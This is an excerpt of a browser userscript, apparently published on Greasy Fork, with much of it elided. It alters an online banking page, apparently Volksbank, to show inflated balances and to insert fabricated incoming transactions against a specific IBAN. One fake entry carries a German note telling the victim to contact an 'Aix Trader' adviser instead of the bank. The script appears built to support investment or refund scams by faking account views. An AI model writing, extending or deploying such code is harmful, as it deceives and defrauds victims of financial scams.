// ==UserScript==
// @name         Ed Post CH Manfred Cristoephl
...
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/489142/Ed%20Post%20CH%20Manfred%20Cristoephl.user.js
// @updateURL https://update.greasyfork.org/scripts/489142/Ed%20Post%20CH%20Manfred%20Cristoephl.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  427964 },
        { index: 1, adjustmentAmount: 427964 },
        { index: 2, adjustmentAmount: 5000 },
        { index: 3, adjustmentAmount: 422964 },
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE81 5486 2500";
    var targetTextContent2 = " 9107 4430 30";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 422964.0; // Adjust the amount as needed
    ...
    const TRANSACTIONS = [
 {
        ...
        },
       {
        ...
        },
        {
            ...
            {
            title: 'JP Morgan Chase',
            description: 'Wenden Sie sich an Aix Trader Berater, nicht die Bank, damit nicht gesperrt.',
            amount: '397.964,00',
            date: 'Heute',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
